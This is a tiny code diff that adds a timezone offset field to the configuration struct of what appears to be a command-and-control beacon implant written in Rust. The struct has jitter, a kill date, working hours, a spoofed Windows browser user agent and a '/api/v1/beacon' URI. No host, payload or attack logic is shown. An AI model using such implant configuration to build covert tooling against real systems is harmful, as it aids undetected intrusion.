@@ -43,6 +43,7 @@ pub extern "C" fn _start() -> ! {
         jitter: 10,
         kill_date: 0,
         working_hours: (0, 0),
+        tz_offset: 0,
         user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         uri: "/api/v1/beacon",
         host_header: "",
